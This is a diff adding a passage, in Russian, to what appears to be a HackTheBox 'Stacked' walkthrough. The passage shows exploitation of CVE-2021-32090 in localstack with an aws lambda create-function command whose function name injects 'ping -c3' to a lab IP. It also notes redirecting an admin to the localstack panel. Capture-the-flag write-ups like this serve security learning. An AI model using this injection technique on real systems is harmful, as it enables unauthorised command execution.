@@ -199,4 +199,14 @@ $ cat out
 
 ![](../.gitbook/assets/12.png)
 
-Вернулось сообщение - Hello, значит функция успешно объявлена и сохранена.
+Вернулось сообщение - Hello, значит функция успешно объявлена и сохранена. Теперь мы можем попробовать эксплуатировать CVE-2021-32090:
+
+```
+$ aws lambda --endpoint=http://s3-testing.stacked.htb create-function --function-name 'func;ping -c3 10.10.16.93' --role user --handler index.handler --runtime nodejs10.x --zip-file fileb://index.zip
+```
+
+Также, чтобы это работало, нам нужно перенаправить админа на панель localstack на 8080 порте:
+
+![](../.gitbook/assets/13.png)
+
+![](../.gitbook/assets/14.png)
